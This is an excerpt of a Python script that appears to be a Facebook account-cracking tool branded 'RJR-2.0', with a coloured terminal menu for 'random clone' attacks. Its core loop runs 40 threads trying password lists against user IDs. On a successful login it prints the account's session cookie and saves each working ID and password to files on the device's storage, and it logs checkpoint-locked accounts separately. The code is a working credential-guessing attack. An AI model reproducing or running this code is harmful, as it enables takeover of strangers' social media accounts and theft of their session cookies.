...
def Alhaj():
    ...
    print("")
    print("\033[1;91m ╔═════════════════════════════════╗")
    print("\033[1;33m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᖇᗩᑎᗪOᗰ ᑕᒪOᑎE ᏴᎠ        \033[1;36m║")
    print("\033[1;92m ╠═════════════════════════════════╣")
    print(" \033[1;33m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
    print(" \033[1;91m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
...
def Alhajs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;96m║\033[1;92m ᏀᏆҒͲ ᏴƳ RJR-2.0 ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM RJR-2.0 ')
    print("\033[1;91m╚═══════════════════════════╝")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;96m[\033[1;92mҒᏴ-RJR-2.0-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
                open('/sdcard/RJR-2.0-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[ҒᏴ-RJR-2.0-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
                open('/sdcard/RJR-2.0-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
